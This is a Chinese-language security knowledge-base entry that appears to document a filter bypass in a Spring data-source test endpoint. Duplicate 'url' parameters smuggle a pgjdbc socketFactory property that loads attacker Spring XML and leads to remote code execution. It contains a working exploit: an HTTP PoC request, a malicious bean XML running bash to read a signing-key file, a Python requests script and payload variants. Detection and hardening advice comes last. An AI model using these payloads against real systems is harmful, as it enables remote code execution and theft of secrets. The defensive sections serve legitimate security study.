---
id: web-java-component-jdbc-duplicate-param-socketfactory-property-smuggling
title: JDBC 数据源测试重复 url 参数属性走私：& 开头的第二值拼成 socketFactory，绕过字面量过滤加载 Spring XML RCE
type: scenario
domain: web
path: web/java/component
technique: jdbc-duplicate-param-socketfactory-property-smuggling
tags:
- java
- spring
- jdbc
- pgjdbc
- socketfactory
- parameter-pollution
- filter-bypass
- xml-bean
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:15+08:00'
  notes: 对照小宝：重复 url 参数、& 开头第二值拼成 socketFactory、pgjdbc ClassPathXmlApplicationContext file:// 一致；未复跑
url: /docs/web/java/component/web-java-component-jdbc-duplicate-param-socketfactory-property-smuggling/
draft: false
kb_aliases:
- pgjdbc socketFactory 绕过过滤
- 重复 url 参数属性走私
- Spring 逗号拼接参数绕过
- datasource/test RCE
- ClassPathXmlApplicationContext file bean
- socketFactoryArg
---

## 一句话结论

数据源测试接口只对 `url` 参数做字面量 `socketfactory` 过滤时，把 `url` 重复传两次、让第二个值以编码后的 `&` 开头，Spring 的参数绑定会把两个值拼接后交给 pgjdbc；拼接后的 `&socketFactory=...` 成为合法的 JDBC 属性键，驱动在建立连接前实例化 `ClassPathXmlApplicationContext` 加载攻击者 XML，最终执行任意代码。

## 原理

- **过滤与使用的参数不是同一个值**：`/datasource/test` 从请求中取 `url` 并用 `contains("socketfactory")` 之类的方式拦截。攻击者提交两个同名 `url` 参数：过滤器只看/只校验其中一个（通常第一个），而 Spring 的参数绑定把重复值按逗号拼接（或以数组形式交给后续逻辑），真正传给 `DriverManager` 的是拼接后的字符串。
- **属性走私**：第二个 `url` 的值以 `&socketFactory=...` 开头。拼接后，`&` 把它变成 pgjdbc URL 查询串中的新属性键；若第一个值末尾带有合法查询参数（如 `?a=b`），拼接结果为 `...?a=b,&socketFactory=...`，逗号落在前一个参数值里，不影响 `socketFactory` 键的解析。
- **pgjdbc 的 socketFactory**：PostgreSQL JDBC 驱动支持 `socketFactory` 属性指定一个 `javax.net.SocketFactory` 实现类，驱动在建立连接前会实例化它。把值设为 `org.springframework.context.support.ClassPathXmlApplicationContext`、并用 `socketFactoryArg` 传入 `file:///path/bean.xml`，驱动就会用该 XML 路径构造 Spring 容器；容器解析 XML、创建 bean、执行 `init-method`/构造器，形成任意代码执行。
- **为什么安全沙箱没挡住**：原文环境中容器配置了 `ForbiddenNetworkAccessSecurityManager`，但 socketFactory 的实例化与 Spring XML 解析发生在驱动/Spring 内部，未触发被禁止的网络访问检查；真正执行命令的 bean 在进程内运行，绕过了网络层限制。
- 该链只需要“可控 JDBC URL + 可控本地文件（或可访问的 XML）+ 服务端主动测试连接”三个条件，文件可通过上传、日志写入、临时文件等任意方式落地。

## 触发条件

- 应用提供数据源测试/连接测试接口，`url` 参数可由低权限用户控制，且服务端会实际调用 `DriverManager.getConnection` 或连接池初始化。
- 过滤只针对 `socketFactory` 字面量，未对重复参数、编码后的 `&`、`%26` 做规范化；Spring 参数绑定存在重复值拼接行为。
- 使用支持 `socketFactory`/`socketFactoryArg` 属性的 pgjdbc（或其他允许任意 SocketFactory 类的 JDBC 驱动）。
- 攻击者能让目标读取一个可控 XML 文件（上传目录、临时目录、Web 根目录等），且类路径中存在 Spring Context。

## 利用步骤

1. 准备恶意 Spring XML：用 `java.lang.ProcessBuilder`、`MethodInvokingFactoryBean` 或 SpEL 在 bean 初始化时执行命令/读取文件。
2. 将 XML 上传或写到目标可读路径，例如 `/tmp/bean.xml`、上传目录。
3. 向数据源测试接口提交两个 `url` 参数：第一个为合法 JDBC URL 且带一个查询参数，第二个为 `%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file:///tmp/bean.xml`。
4. 观察是否触发连接测试；若驱动版本/属性名不同，尝试 `socketFactory` 大小写、`socketFactoryArg`、`sslfactory` 等变体。
5. 命令执行后读取下一跳配置（如 `/etc/xbw/report.json` 中的签名密钥），或将结果写到 Web 可读路径。

## PoC

```http
POST /datasource/test HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

url=jdbc:postgresql://127.0.0.1:5432/x%3Fa%3Db&url=%26socketFactory%3Dorg.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg%3Dfile%3A%2F%2F%2Ftmp%2Fbean.xml
```

```xml
<!-- /tmp/bean.xml：bean 初始化时执行命令 -->
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value><value>-c</value>
        <value>id > /tmp/pwned; cat /etc/xbw/report.json > /tmp/report.json</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

```python
# 若需要精确控制编码，用 requests 的 data 列表形式保留重复参数
requests.post("http://target/datasource/test", data=[
    ("url", "jdbc:postgresql://127.0.0.1:5432/x?a=b"),
    ("url", "&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
            "&socketFactoryArg=file:///tmp/bean.xml"),
])
```

## 变体与关联

- 变体：`socketFactory` 可换成 `sslfactory`、`socketFactoryArg` 换成 `sslfactoryarg`；其他 JDBC 驱动（MySQL `autoDeserialize`、H2 `INIT`、Oracle `LDAP`）有各自的 URL 属性注入面。
- 变体：重复参数也可换成 `url[]=...`、`url=...&url=...`、分号/逗号分隔、大小写混写、`%26` 双重编码，取决于 Spring 绑定与过滤器解析差异。
- 关联：[[web-java-component-weaver-ecology-jdbc-socketfactory-memshell]]（泛微 JDBC socketFactory 加载上传 XML 注入内存马）、[[web-java-deserialization-fastjson-postgres-pgconnection-xml-rce]]（Fastjson 触发 pgjdbc XML RCE）、[[web-java-framework-spring-requestbody-mass-assignment-admin-content-forgery]]（Spring 参数绑定/批量赋值差异）。
- 边界：pgjdbc 新版本对 socketFactory 类做了限制/白名单，或数据源测试不实际连接时失效；目标类路径无 Spring Context 时需换其他 bean 容器/工厂；XML 文件路径必须目标可读。

## 检测与防御

- 检测：请求中出现重复 `url` 参数、`%26socketFactory`、`socketFactoryArg`、`ClassPathXmlApplicationContext`；数据源测试接口被低权限用户频繁调用；异常 JDBC URL 含 `file://`、`http://` 或未知属性键。
- 修复：数据源测试接口仅管理员可用；对 `url` 做严格白名单（协议、主机、端口、允许的属性键），拒绝重复参数与编码后的分隔符；禁用 `socketFactory`/`sslfactory` 等可实例化任意类的属性。
- 加固：升级 pgjdbc 并限制 SocketFactory 实现类；禁止从可写目录加载 Spring XML；数据源配置由服务端固定，不接受用户输入；出网与文件读取最小权限。
